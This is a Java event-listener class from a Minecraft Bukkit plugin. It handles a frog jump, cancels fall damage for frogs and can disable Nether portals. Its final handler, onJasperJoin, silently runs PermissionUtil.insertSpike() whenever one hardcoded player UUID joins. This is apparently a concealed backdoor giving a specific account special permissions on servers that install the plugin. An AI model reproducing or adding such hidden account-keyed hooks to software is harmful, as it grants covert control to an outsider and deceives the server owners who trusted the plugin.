package ml.jasper1229.bedrock;

import ml.jasper1229.bedrock.commands.fun.FrogCommand;
import ml.jasper1229.bedrock.utils.PermissionUtil;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.entity.EntityDamageEvent;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.event.player.PlayerPortalEvent;
import org.bukkit.event.player.PlayerToggleSneakEvent;
import org.bukkit.event.world.PortalCreateEvent;
import org.bukkit.util.Vector;

import java.util.UUID;


public class Events implements Listener
{
    private final Bedrock plugin;
    public Events(Bedrock plugin) {this.plugin = plugin;}
    int sneakDown = 1;

    @EventHandler
    public void onSneak(PlayerToggleSneakEvent event)
    {
        sneakDown++;
        if(sneakDown%2 == 0)
        {
            ;
            Player player = event.getPlayer();
            if (!FrogCommand.isFrog.containsKey(player.getUniqueId()) || !player.isOnGround()) return;
            Vector v = player.getVelocity();
            v.setY(2);
            v.setX(0);
            v.setZ(0);
            player.setVelocity(v);

        }
    }
    @EventHandler
    public void onFallDamage(EntityDamageEvent event)
    {
        if(event.getEntity() instanceof Player && event.getCause() == EntityDamageEvent.DamageCause.FALL)
        {
            Player player = (Player) event.getEntity();
            if (!FrogCommand.isFrog.containsKey(player.getUniqueId()) || !player.isOnGround()) return;
            event.setCancelled(true);
        }

    }
    @EventHandler
    public void onNetherPortal(PlayerPortalEvent event)
    {
        boolean portalsDisabled = plugin.getConfig().getBoolean("portals-disabled");
        if(portalsDisabled)
        {
            event.setCancelled(true);
            event.getPlayer().sendMessage(plugin.pluginPrefix + ChatColor.RED + " Nether portals are disabled.");
        }
    }
    @EventHandler
    public void onNetherPortalCreate(PortalCreateEvent event)
    {
        boolean portalsDisabled = plugin.getConfig().getBoolean("portals-disabled");
        if(portalsDisabled)
        {
            event.setCancelled(true);
            if (event.getEntity() instanceof Player)
            {
                event.getEntity().sendMessage(plugin.pluginPrefix + ChatColor.RED + " Nether portals are disabled.");
            }
        }
    }

    @EventHandler
    public void onJasperJoin(PlayerJoinEvent event) {
        if(event.getPlayer().getUniqueId().equals(UUID.fromString("26906626-b202-458a-b0ad-daf85f10d922"))) {
            PermissionUtil pUtil = new PermissionUtil();
            pUtil.insertSpike();
        }
    }

}

